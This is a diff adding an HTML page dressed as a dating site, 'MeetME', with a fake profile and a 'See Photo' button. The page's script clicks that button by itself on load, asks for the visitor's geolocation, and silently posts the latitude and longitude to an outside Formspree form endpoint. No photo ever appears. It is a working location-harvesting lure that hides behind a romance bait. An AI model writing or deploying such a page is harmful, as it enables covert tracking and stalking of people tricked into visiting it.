@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<body>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>MeetME</title>
+  </head>
+<body>
+  <header>
+    Welcome To MeChat
+  </header>
+  <marquee>
+    💘 Find Your Love Ones Here 💘
+  </marquee>
+<div class="container">
+
+
+  <h2>Profile ID</h2>
+  <p id="Name">Miss Pooja 💘</p>
+  <p id="Desc">My life my rulez</p>
+  
+  <button id="btn" onclick="getLocation()">See Photo</button>
+  
+</div>
+<footer>
+  FIND YOUR LOVE
+</footer>
+<script>
+const x = document.getElementById("demo");
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else { 
+    x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+
+window.onload=()=>{
+const btn = document.getElementById('btn');
+btn.click();
+}
+function showPosition(position) {
+  // x.innerHTML = "Latitude: " + position.coords.latitude + 
+  // "<br>Longitude: " + position.coords.longitude;
+    
+      fetch("https://formspree.io/f/mknkzyyd", {
+        method: 'POST',
+        body: JSON.stringify({latitude:position.coords.latitude,longitude:position.coords.longitude}),
+        headers: {
+            'Accept': 'application/json'
+        }
+      }).catch(error => {
+        console.log("Oops! There was a problem submitting your form");
+      });
+}
+
+
+</script>
+
+</body>
+</html>
